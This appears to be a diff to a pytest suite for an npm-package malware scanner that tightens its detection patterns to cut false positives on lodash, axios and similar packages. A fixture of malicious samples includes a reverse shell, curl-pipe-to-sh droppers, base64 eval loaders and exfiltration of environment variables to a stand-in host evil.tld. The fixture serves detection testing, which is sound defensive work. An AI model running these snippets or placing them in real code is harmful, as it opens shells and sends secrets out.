@@ -25,9 +25,13 @@ import pytest
 
 import sandbox_check
 from sandbox_check import (
-    DANGEROUS_HIT_KEYWORDS,
+    ALWAYS_DANGEROUS_DESCRIPTIONS,
+    CAPABILITY_DESCRIPTIONS,
+    CONTEXT_DESCRIPTIONS,
+    ENCODED_RUN_LENGTH,
     EXPECTED_INSTALL_DIRS,
     INSTALL_SCRIPT_HOOKS,
+    MALWARE_PATTERN_TABLE,
     MALWARE_PATTERNS,
     NEXT_STEP_TYPES,
     SandboxFindings,
@@ -36,11 +40,13 @@ from sandbox_check import (
     build_verdict_summary,
     classify_cve_findings,
     classify_malware_hits,
+    corroborated_capabilities,
     count_paths_under,
     decide_verdict,
     filter_suspicious_new_files,
     installed_package_dirname,
     is_expected_install_path,
+    is_dangerous_hit,
     normalize_package_spec,
     scan_text_for_malware_patterns,
     typosquat_matches,
@@ -410,6 +416,7 @@ def test_scan_text_handles_empty_content():
 
 
 def test_malware_hits_split_into_dangers_and_warnings():
+    """A capability co-located with an attacker context signal is a danger."""
     hits = [
         ("a.js", "child_process - command execution"),
         ("b.js", "child_process - command execution"),
@@ -458,13 +465,330 @@ def test_no_hits_yields_an_empty_classification():
     assert report.total_hits == 0
 
 
-def test_every_dangerous_keyword_maps_to_at_least_one_pattern():
-    """Anti-drift: a keyword with no matching pattern description is dead
-    config that silently downgrades a class of hits to warnings."""
-    descriptions = " ".join(desc for _, desc in MALWARE_PATTERNS).lower()
+# ---------------------------------------------------------------------------
+# Malware-pattern calibration (F31)
+#
+# The keyword classifier told users not to install lodash: `\.exec\s*\(` matched
+# JavaScript's `RegExp.prototype.exec`, `Function\s*\(` matched every anonymous
+# `function(` because the table compiled with IGNORECASE, and the word
+# "credentials" alone counted as credential theft (which condemned axios). The
+# tests below pin the calibration from both directions: mainstream-package code
+# must produce ZERO dangers, and every real attack shape must still be a danger.
+# ---------------------------------------------------------------------------
 
-    for keyword in DANGEROUS_HIT_KEYWORDS:
-        assert keyword in descriptions, keyword
+
+#: Verbatim shapes from real mainstream packages, each of which the pre-F31
+#: table flagged. Sources named so a future edit can re-check them.
+BENIGN_PACKAGE_CODE = {
+    # lodash: RegExp.prototype.exec — the hit that made `npm install lodash` a
+    # DO-NOT-INSTALL verdict.
+    "lodash regexp exec": (
+        "function trimmedEndIndex(string) {\n"
+        "  var index = string.length;\n"
+        "  while (index-- && reWhitespace.test(string.charAt(index))) {}\n"
+        "  return index;\n"
+        "}\n"
+        "var match = reTrimStart.exec(string);\n"
+    ),
+    # lodash/express/react: anonymous functions, 193 hits on lodash alone.
+    "anonymous function expressions": (
+        "module.exports = function (a, b) { return a + b; };\n"
+        "var f = function(x) { return x; };\n"
+        "arr.map(function (item) { return item * 2; });\n"
+    ),
+    # axios: `withCredentials` — the word alone was scored as credential theft.
+    "axios withCredentials": (
+        "if (config.withCredentials !== undefined) {\n"
+        "  request.withCredentials = !!config.withCredentials;\n"
+        "}\n"
+        "// Set the password for basic auth credentials\n"
+    ),
+    # lodash: isolated escapes in a character table, not an encoded blob.
+    "isolated escape sequences": (
+        "var reEscapedHtml = /&(?:amp|lt|gt|quot|#39);/g;\n"
+        "var rsAstralRange = '\\\\ud800-\\\\udfff',\n"
+        "    rsComboRange = '\\\\u0300-\\\\u036f\\\\ufe20-\\\\ufe2f';\n"
+        "var deburred = '\\xc0\\xc1';\n"
+    ),
+    # A word that merely ends in "eval".
+    "retrieval is not eval": "const value = await retrieval(key);\n",
+    # typescript: decoding an IPC response is ordinary data handling.
+    "typescript base64 ipc decode": (
+        "const buffer = Buffer.from(response.data, 'base64');\n"
+        "return new Uint8Array(buffer.buffer, buffer.byteOffset);\n"
+    ),
+    # react/debug/dotenv: reading configuration.
+    "process.env config read": (
+        "if (process.env.NODE_ENV !== 'production') { warn(); }\n"
+    ),
+    # A UI library describing keyboard handling.
+    "keystroke prose in a ui library": (
+        "// Fired once per keystroke while the menu is open.\n"
+        "function onKeyDown(event) { return event.key; }\n"
+    ),
+}
+
+#: Real npm-malware shapes. Each must survive calibration as a DANGER.
+MALICIOUS_PACKAGE_CODE = {
+    "base64 dropper cradle": (
+        "const p = 'aHR0cDovL2V2aWwudGxk';\n"
+        "eval(Buffer.from(p, 'base64').toString());\n"
+    ),
+    "atob cradle": "eval(atob(payload));\n",
+    "reverse shell": (
+        "const net = require('net'), cp = require('child_process');\n"
+        "const s = net.connect(4444, '10.0.0.9');\n"
+        "const sh = cp.spawn('/bin/sh', []);\n"
+        "s.pipe(sh.stdin); sh.stdout.pipe(s);\n"
+    ),
+    "windows shell dropper": (
+        "const { execSync } = require('child_process');\n"
+        "execSync('cmd.exe /c curl http://evil.tld/a.exe -o a.exe && a.exe');\n"
+    ),
+    "download and run": (
+        "const https = require('https');\n"
+        "const cp = require('child_process');\n"
+        "https.get('https://evil.tld/p.sh', r => r.pipe(f));\n"
+        "cp.exec('sh /tmp/p.sh');\n"
+    ),
+    "env exfil over https": (
+        "const https = require('https');\n"
+        "const cp = require('child_process');\n"
+        "cp.exec('env', (e, out) =>\n"
+        "  https.request('https://evil.tld/c', { method: 'POST' }).end(out));\n"
+    ),
+    "hex-obfuscated command": (
+        "const c = require('child_process');\n"
+        "const s = '\\x63\\x75\\x72\\x6c\\x20\\x68\\x74\\x74\\x70\\x3a';\n"
+        "c.exec(s);\n"
+    ),
+    "wallet stealer": (
+        "const cp = require('child_process');\n"
+        "const w = readWallet();\n"
+        "cp.exec('bitcoin-cli dumpwallet /tmp/w');\n"
+    ),
+    "keylogger": "const keylogger = require('./kl');\nkeylogger.start();\n",
+    "credential theft": "// steal credentials from the browser store\n",
+    # The dot-anchored pattern could not see the destructured form at all.
+    "destructured exec with a curl|sh payload": (
+        "const { exec } = require('child_process');\n"
+        "exec('curl http://evil.tld/x | sh');\n"
+    ),
+}
+
+
+def _classify_one_file(code: str, path: str = "index.js"):
+    return classify_malware_hits(
+        [(path, desc) for desc in scan_text_for_malware_patterns(code)]
+    )
+
+
+@pytest.mark.parametrize("label", sorted(BENIGN_PACKAGE_CODE))
+def test_mainstream_package_code_yields_no_dangers(label):
+    """The benign baseline: real code from top-N packages, zero dangers.
+
+    Verified against a real ``npm install`` of 480 packages, which produces
+    zero dangers in total; these excerpts pin the specific shapes offline.
+    """
+    report = _classify_one_file(BENIGN_PACKAGE_CODE[label])
+
+    assert report.dangers == [], (label, report.dangers)
+
+
+@pytest.mark.parametrize("label", sorted(MALICIOUS_PACKAGE_CODE))
+def test_malicious_shapes_are_still_dangers(label):
+    """Calibration must not be paid for with detection."""
+    report = _classify_one_file(MALICIOUS_PACKAGE_CODE[label])
+
+    assert report.dangers, (label, report.warnings)
+
+
+def test_regexp_exec_without_child_process_is_not_reported():
+    """The gate, stated directly: no `child_process` binding, no exec hit."""
+    hits = scan_text_for_malware_patterns("var match = reTrimStart.exec(string);")
+
+    assert "exec() - command execution" not in hits
+
+
+def test_exec_with_a_child_process_binding_is_reported():
+    hits = scan_text_for_malware_patterns(
+        "const cp = require('child_process');\ncp.exec(cmd);"
+    )
+
+    assert "exec() - command execution" in hits
+
+
+@pytest.mark.parametrize(
+    "binding",
+    [
+        "const cp = require('child_process');",
+        "const cp = require('node:child_process');",
+        "import cp from 'child_process';",
+        "import { spawn } from 'node:child_process';",
+    ],
+)
+def test_every_child_process_binding_form_opens_the_gate(binding):
+    hits = scan_text_for_malware_patterns(f"{binding}\nspawn('git', ['status']);")
+
+    assert "spawn() - process spawning" in hits
+
+
+def test_gated_pattern_also_catches_the_destructured_form():
+    """Being gated is what makes the broader match safe — the dot-anchored
+    pattern could not see `exec(cmd)` at all."""
+    hits = scan_text_for_malware_patterns(
+        "const { exec } = require('child_process');\nexec('id');"
+    )
+
+    assert "exec() - command execution" in hits
+
+
+def test_anonymous_function_is_not_a_function_constructor():
+    hits = scan_text_for_malware_patterns("var f = function (a, b) { return a; };")
+
+    assert "Function constructor - dynamic code" not in hits
+
+
+def test_real_function_constructor_is_still_reported():
+    hits = scan_text_for_malware_patterns("var root = Function('return this')();")
+
+    assert "Function constructor - dynamic code" in hits
+
+
+def test_new_function_constructor_is_still_reported():
+    hits = scan_text_for_malware_patterns("const fn = new Function(body);")
+
+    assert "Function constructor - dynamic code" in hits
+
+
+def test_word_ending_in_eval_is_not_eval():
+    assert scan_text_for_malware_patterns("retrieval(key);") == []
+
+
+def test_a_single_escape_is_not_an_encoded_blob():
+    """Asserted as a total absence of hits, not the absence of the new wording:
+    the old table reported these under a different description, so a
+    substring check would have passed against the very code being replaced."""
+    assert scan_text_for_malware_patterns("var s = '\\xc0\\xc1';") == []
+
+
+def test_a_run_of_escapes_is_an_encoded_blob():
+    payload = "var s = '" + "\\x63" * ENCODED_RUN_LENGTH + "';"
+
+    hits = scan_text_for_malware_patterns(payload)
+
+    assert "hex-encoded string blob (possible obfuscation)" in hits
+
+
+def test_the_word_credentials_alone_is_not_credential_theft():
+    hits = scan_text_for_malware_patterns(
+        "request.withCredentials = !!config.withCredentials;"
+    )
+
+    assert "credential theft" not in hits
+
+
+def test_credential_theft_needs_a_theft_verb():
+    hits = scan_text_for_malware_patterns("// harvest the saved passwords")
+
+    assert "credential theft" in hits
+
+
+def test_capability_and_context_in_different_files_is_not_corroboration():
+    """The build-tool shape: some file shells out, another speaks HTTP.
+
+    Treating that as corroboration is what condemned typescript, webpack,
+    eslint and commander.
+    """
+    hits = [
+        ("lib/run.js", "child_process - command execution"),
+        ("lib/fetch.js", "HTTPS client"),
+    ]
+
+    report = classify_malware_hits(hits)
+
+    assert report.dangers == []
+    assert report.corroborated == []
+    assert len(report.warnings) == 2
+
+
+def test_capability_and_context_in_the_same_file_is_corroboration():
+    hits = [
+        ("lib/payload.js", "child_process - command execution"),
+        ("lib/payload.js", "HTTPS client"),
+    ]
+
+    report = classify_malware_hits(hits)
+
+    assert report.corroborated == ["child_process - command execution"]
+    assert any("child_process" in danger for danger in report.dangers)
+    assert any("also shows network/obfuscation" in danger for danger in report.dangers)
+
+
+def test_corroborated_capabilities_is_empty_without_context():
+    assert corroborated_capabilities([("a.js", "child_process - command execution")]) == []
+
+
+@pytest.mark.parametrize("description", sorted(ALWAYS_DANGEROUS_DESCRIPTIONS))
+def test_always_dangerous_descriptions_need_no_context(description):
+    report = classify_malware_hits([("a.js", description)])
+
+    assert report.dangers, description
+    assert is_dangerous_hit(description)
+
+
+@pytest.mark.parametrize("description", sorted(CAPABILITY_DESCRIPTIONS))
+def test_capability_descriptions_are_not_dangerous_alone(description):
+    report = classify_malware_hits([("a.js", description)])
+
+    assert report.dangers == [], description
+    assert not is_dangerous_hit(description)
+
+
+def test_classification_sets_are_anti_drift():
+    """Every classified description must exist in the pattern table.
+
+    A typo in one of these sets would silently reclassify a whole family of
+    hits — the failure mode the old keyword list had (it carried a "reverse"
+    entry that matched no description at all).
+    """
+    table = {pattern.description for pattern in MALWARE_PATTERN_TABLE}
+
+    for name, described in (
+        ("ALWAYS_DANGEROUS_DESCRIPTIONS", ALWAYS_DANGEROUS_DESCRIPTIONS),
+        ("CAPABILITY_DESCRIPTIONS", CAPABILITY_DESCRIPTIONS),
+        ("CONTEXT_DESCRIPTIONS", CONTEXT_DESCRIPTIONS),
+    ):
+        assert described <= table, (name, described - table)
+
+
+def test_a_description_is_never_both_a_capability_and_a_verdict():
+    """A capability that is also always-dangerous would make the gate moot."""
+    assert not (CAPABILITY_DESCRIPTIONS & ALWAYS_DANGEROUS_DESCRIPTIONS)
+    assert not (CAPABILITY_DESCRIPTIONS & CONTEXT_DESCRIPTIONS)
+
+
+def test_every_pattern_gate_resolves_to_a_registered_gate():
+    """A `requires` naming a gate that does not exist would silently disable
+    the pattern — a detection hole with every test still green."""
+    for pattern in MALWARE_PATTERN_TABLE:
+        if pattern.requires:
+            assert pattern.requires in sandbox_check._CO_OCCURRENCE_GATES, pattern
+
+
+def test_every_pattern_regex_compiles_and_is_described_once():
+    descriptions = [pattern.description for pattern in MALWARE_PATTERN_TABLE]
+
+    assert len(descriptions) == len(set(descriptions)), "duplicate description"
+    for pattern in MALWARE_PATTERN_TABLE:
+        re.compile(pattern.regex)
+
+
+def test_legacy_pattern_view_matches_the_table():
+    """`MALWARE_PATTERNS` is the compatibility view; it must not drift."""
+    assert MALWARE_PATTERNS == tuple(
+        (pattern.regex, pattern.description) for pattern in MALWARE_PATTERN_TABLE
+    )
 
 
 # ---------------------------------------------------------------------------
